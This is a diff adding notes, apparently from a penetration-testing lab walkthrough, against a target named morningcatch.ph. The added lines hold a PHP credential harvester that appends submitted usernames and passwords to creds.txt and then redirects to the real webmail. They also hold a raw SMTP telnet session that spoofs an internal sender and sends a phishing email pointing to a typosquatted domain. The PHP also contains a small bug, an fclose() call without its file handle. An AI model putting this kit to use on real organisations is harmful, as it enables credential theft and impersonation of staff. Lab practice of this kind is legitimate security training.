@@ -68,4 +68,38 @@ $ nc -z morningcatch.ph 25
 $ firefox morningcatch.ph
 ```
 
+### PHP Script for Saving Credentials
 
+```php
+<?php
+
+$user = $_POST['_user'];
+$pass = $_POST['_pass'];
+
+$f = fopen("creds.txt", "a");
+
+fwrite($f, "$user:$pass\n");
+
+fclose();
+header("Location: http://morningcatch.ph/mail/");
+die();
+?>
+```
+
+## Email Commands
+
+```
+telnet morningcatch.ph 25
+ehlo morningcatch.ph
+mail from: bjenius@morningcatch.ph
+rcpt to: rbourne@morningcatch.ph
+data
+Subject: 
+
+We are currently testing a new performance configuration for the webmail site, please test the site changes by visiting: http://mornincatch.ph/mail/
+
+Boyd
+
+.
+quit
+```
